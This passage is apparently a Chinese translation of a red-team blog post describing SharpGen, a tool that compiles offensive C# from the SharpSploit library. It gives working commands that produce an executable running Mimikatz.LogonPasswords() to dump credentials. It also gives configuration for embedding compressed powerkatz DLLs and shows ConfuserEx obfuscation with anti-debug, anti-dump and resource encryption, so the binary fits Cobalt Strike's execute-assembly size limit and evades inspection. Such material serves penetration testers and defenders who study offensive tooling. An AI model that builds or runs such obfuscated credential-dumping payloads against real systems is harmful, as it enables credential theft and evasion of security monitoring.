    cobbr@mac:~/SharpGen > dotnet bin/Release/netcoreapp2.1/SharpGen.dll -f example.exe --platform x64 "Console.WriteLine(Mimikatz.LogonPasswords());"
2b.您还可以简单地在resources.yml配置文件禁用不需要的资源，就像我们之前做的那样:
    - Name: SharpSploit.Resources.powerkatz_x86.dll
      File: powerkatz_x86.dll
      Platform: x86
      Enabled: false
    - Name: SharpSploit.Resources.powerkatz_x64.dll
      File: powerkatz_x64.dll
      Platform: x64
      Enabled: true
3.为了进一步减小二进制文件的大小，可以嵌入压缩的Mimikatz资源，而不是使用由SharpSploit支持和处理的默认资源。使用内置的System.IO.Compression对它们进行压缩。这种压缩的效率还不足以让您同时嵌入x64和x86资源，并保持在1MB的限制之下，但仍然显著地减少了二进制大小。这可以在resources.yml中通过启用压缩资源和禁用未压缩资源的方法来完成。
    - Name: SharpSploit.Resources.powerkatz_x86.dll
      File: powerkatz_x86.dll
      Platform: x86
      Enabled: false
    - Name: SharpSploit.Resources.powerkatz_x64.dll
      File: powerkatz_x64.dll
      Platform: x64
      Enabled: false
    - Name: SharpSploit.Resources.powerkatz_x86.dll.comp
      File: powerkatz_x86.dll.comp
      Platform: x86
      Enabled: true
    - Name: SharpSploit.Resources.powerkatz_x64.dll.comp
      File: powerkatz_x64.dll.comp
      Platform: x64
      Enabled: true
4.使用Mimikatz并同时嵌入x64和x86资源的更有效的方法是使用ConfuserEx资源保护，它使用一种更高效的压缩算法。我们将在高级用法部分讨论这个问题。
##### 高级用法
SharpGen支持使用[ConfuserEx](https://github.com/mkaring/ConfuserEx)，这是一个开源的.net应用程序。我熟悉的最初的ConfuserEx可以在[这里](https://github.com/yck1509/ConfuserEx)找到。我非常兴奋地发现ConfuserEx已经在一个新的位置分叉和维护，因为原来的项目已经被放弃了。当我意识到新的ConfuserEx支持
.net内核时，我更加兴奋!这使我们能够在net Framework交叉编译的SharpGen中自动保护和混淆二进制文件。
SharpGen包括一个默认的ConfuserEx项目文件, confuse.cr可与其他ConfuserEx规则一起使用，并可通过命令行参数使用：
    cobbr@mac:~/SharpGen > dotnet bin/Release/netcoreapp2.1/SharpGen.dll -f example.exe --confuse confuse.cr "Console.WriteLine(Mimikatz.LogonPasswords());"
    ...
    [+] Confusing assembly...
    [INFO] Confuser.Core 1.1.0-alpha1.52+gfe12a44191 Copyright © 2014 Ki, 2018 Martin Karing
    [INFO] Running on Unix 17.5.0.0, .NET Framework v4.0.30319.42000, 64 bits
    [DEBUG] Discovering plugins...
    [INFO] Discovered 10 protections, 1 packers.
    [DEBUG] Resolving component dependency...
    [INFO] Loading input modules...
    [INFO] Loading 'example.exe'...
    [INFO] Initializing...
    [DEBUG] Building pipeline...
    [INFO] Resolving dependencies...
    [DEBUG] Checking Strong Name...
    [DEBUG] Creating global .cctors...
    [DEBUG] Watermarking...
    [DEBUG] Executing 'Name analysis' phase...
    [DEBUG] Building VTables & identifier list...
    [DEBUG] Analyzing...
    [INFO] Processing module '5b5xa4qx.14e.exe'...
    [DEBUG] Executing 'Invalid metadata addition' phase...
    [DEBUG] Executing 'Renaming' phase...
    [DEBUG] Renaming...
    [DEBUG] Executing 'Anti-debug injection' phase...
    [DEBUG] Executing 'Anti-dump injection' phase...
    [DEBUG] Executing 'Anti-ILDasm marking' phase...
    [DEBUG] Executing 'Encoding reference proxies' phase...
    [DEBUG] Executing 'Constant encryption helpers injection' phase...
    [DEBUG] Executing 'Resource encryption helpers injection' phase...
    [DEBUG] Executing 'Constants encoding' phase...
    [DEBUG] Executing 'Anti-tamper helpers injection' phase...
    [DEBUG] Executing 'Control flow mangling' phase...
    [DEBUG] Executing 'Post-renaming' phase...
    [DEBUG] Executing 'Anti-tamper metadata preparation' phase...
    [DEBUG] Executing 'Packer info extraction' phase...
    [INFO] Writing module '5b5xa4qx.14e.exe'...
    [DEBUG] Encrypting resources...
    [INFO] Finalizing...
    [DEBUG] Saving to '/Users/cobbr/Projects/bitbucket/SharpGen/Output/example.exe'...
    [DEBUG] Executing 'Export symbol map' phase...
    [INFO] Done.
    Finished at 5:03 PM, 0:02 elapsed.
    [*] Compiled assembly written to: /Users/cobbr/SharpGen/Output/example.exe
默认的confuse.cr文件只包含一个支持资源保护的规则。ConfuserEx资源保护对嵌入式资源执行加密和LZMA压缩。LZMA压缩是一种比System.IO.Compression更有效的压缩算法。对SharpGen中包含的powerkatz*.dll.comp文件执行进行压缩，这种更高效的压缩允许我们将两个Mimikatz二进制文件嵌入到编译后的二进制文件中，并且仍然低于1MB的Cobalt
Strike运行程序的限制!一个重要的注意事项是，在使用此技术时，您应该嵌入资源的非压缩版本，因为以前压缩的文件的压缩效果并不是很好。
除了资源保护，confuse.cr可以使用其他ConfuserEx规则来修改项目文件。为了便于使用，默认包含许多可以取消注释从而启用的附加规则：
                    -->
                     -->
                   -->
                   -->
                     -->
                     -->
              -->
                     -->
                        -->
关于可用的ConfuserEx保护的更多信息，我推荐你阅读[ConfuserEx
Wiki文档](https://github.com/yck1509/ConfuserEx/wiki/Protections)
使用SharpGen需要注意的另一个特性是，SharpGen试图通过删除未使用的类型来优化源代码。它这样做是为了减少最终的二进制大小，但也为了隐蔽性考虑。如果您的程序没有需要，那么就没有理由包含Mimikatz和PE加载源代码!如果您在Source文件夹下添加了许多库，那么这将变得非常有用，因为您可能不需要为每次编译而引用所有的库。
SharpGen提供了在编译期间进行的优化的非常透明的信息，并且在编译时会一直打印原始源代码和经过优化的源代码。
这种优化看起来运行得很好，但是在自动化源代码修改时，总是有出现问题的风险。因此，如果您遇到这个优化问题，您总是可以使用--no-optimization命令行参数禁用它(请注意，这可能会增加您的二进制文件大小!
    cobbr@mac:~/SharpGen > dotnet bin/Release/netcoreapp2.1/SharpGen.dll -f example.exe --no-optimization "Console.WriteLine(Mimikatz.LogonPasswords());"
    ...
    [*] Compiled assembly written to: /Users/cobbr/SharpGen/Output/example.exe
##### 未来会增加的特性
巧合的是，上周刚刚发布了一个类似的工具，名为[SharpCompile](https://github.com/SpiderLabs/SharpCompile)，其中还是有一些关键区别。我认为SharpCompile最酷的一方面是包含一个在后台处理所有编译的攻击脚本，这样你就不必放弃Cobalt
Strike的接口了!
我很乐意为SharpGen添加一个类似的特性，它可以在后台处理所有的编译工作，并防止用户放弃使用Cobalt
Strike接口生成新程序。因此，在不久的将来，SharpGen将会加入这一特性。
##### 总结
使用令人讨厌的c#同时也是令人兴奋的，但也伴随着一些实战中的挑战，特别是当将工具集格式化为库时。就我个人而言，我希望看到更多的开源工具集以库的形式发布，带有一个可选的前端控制台应用程序接口，这对于我们双方来说都大有益处。
这些实际挑战的解决方案必须选择一种执行方法，同时平衡方便和灵活之间的需求。
SharpGen是我解决这个平衡问题的方法，我希望其他人会觉得它有用。但其他可行的解决方案，如SharpSploitConsole,
SharpAttack和SharpCompile，我相信其他的方法也会出现。我鼓励其他人考虑这些接受这些挑战，在合适的场景下，使用合适的工具。
##### Credits
SharpGen的成功使用归功于一些开源库：
  * [Roslyn](https://github.com/dotnet/roslyn)-SharpGen使用Roslync#编译器和微软的 Microsoft.CodeAnalysis.CSharp
  * [CommandLineUtils](https://github.com/natemcmaster/CommandLineUtils)\- SharpGen使用由[Nate McMaster](https://twitter.com/natemcmaster)编写的McMaster.Extensions.CommandLineUtils库来解析命令行参数。
  * [ConfuserEx](https://github.com/mkaring/ConfuserEx)-SharpGen可选择性地利用ConfuserEx来配置保护和混淆，最初由[yck1509](https://github.com/yck1509/ConfuserEx)编写，现在由[mkaring](https://github.com/mkaring)维护。
  * [dnlib](https://github.com/0xd4d/dnlib)-ConfuserEx本身使用dnlib，这是一个由[0xd4d](https://github.com/0xd4d)编写的开源的.net程序读写工具libary。
  * [YamlDotNet](https://github.com/aaubry/YamlDotNet)-SharpGen使用由[aaubry](https://github.com/aaubry)编写的用于解析YAML的开源.NET库YamlDotNet来解析YAML配置文件。
我还要感谢在这篇文章中提到的一些其它的开源项目:
  * [SharpAttack](https://github.com/jaredhaight/SharpAttack)-SharpAttack是由[Jared](https://twitter.com/jaredhaight) Haight编写,利用了ILMergesharedhaight的开源控制台应用前端。
  * [SharpSploitConsole](https://github.com/anthemtotheego/SharpSploitConsole)-SharpSploitConsole是利用Costura的SharpSploit的开源控制台应用程序前端，由[anthemtotheego](https://twitter.com/anthemtotheego)和[g0ldengunsec](https://twitter.com/G0ldenGunSec)编写。
  * [SharpCompile](https://github.com/SpiderLabs/SharpCompile/)-一个自动化的,令人讨厌的.net编译解决方案，它利用了攻击者脚本和使用了css .exe的HTTP服务器。
  * [Costura](https://github.com/Fody/Costura)-Costura将引用程序加载到资源中。
  * [ILMerge](https://github.com/dotnet/ILMerge)-ILMerge是一个静态的.net程序集链接器，由[Mike Barnett](https://github.com/mike-barnett)编写，由Microsoft维护。
最后，我推荐一些其他的资源：
  * AssemblyResolve -
  * More AssemblyResolve -
  * System.Reflection文档-